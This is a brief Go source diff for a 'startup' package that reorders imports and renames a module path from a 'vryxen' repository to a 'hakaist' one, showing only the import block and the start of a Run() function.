@@ -1,11 +1,12 @@
 package startup
 
 import (
-	"golang.org/x/sys/windows/registry"
 	"os"
 	"os/exec"
 
-	"github.com/unf6/vryxen/pkg/utils/fileutil"
+	"golang.org/x/sys/windows/registry"
+
+	"github.com/lukyydnv/hakaist/pkg/utils/fileutil"
 )
 
 func Run() error {
